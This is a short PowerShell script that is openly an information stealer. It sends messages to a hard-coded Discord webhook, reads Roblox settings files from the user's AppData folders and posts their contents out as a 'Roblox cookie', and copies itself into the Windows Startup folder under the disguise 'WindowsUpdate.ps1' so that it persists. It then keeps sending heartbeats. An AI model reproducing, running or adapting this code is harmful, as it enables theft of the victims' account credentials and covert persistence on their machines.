$webhook = "https://discordapp.com/api/webhooks/1489258976133775421/oQkCQeD7ts1khlIgKb8uWE-dSxvy_iFNGDU62AzRhdyJPCWlAmN-2Jo4w985gthzZL6n"

function Send {
    param([string]$msg)
    Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$msg} | ConvertTo-Json) -ContentType "application/json"
}

Send "**2FA STEALER ACTIVE** | PC: $env:COMPUTERNAME"

# Roblox Cookie
$paths = "$env:LOCALAPPDATA\Roblox\GlobalBasicSettings_13.xml", "$env:APPDATA\Roblox\GlobalBasicSettings_13.xml"
foreach ($p in $paths) {
    if (Test-Path $p) {
        $c = Get-Content $p -Raw
        Send "**ROBLOX COOKIE** ```$c```"
    }
}

# Persistence
$scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.ps1"
Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force

Send "Stealer installed permanently."

while ($true) {
    Start-Sleep -Seconds 180
    Send "Stealer heartbeat - still active"
}
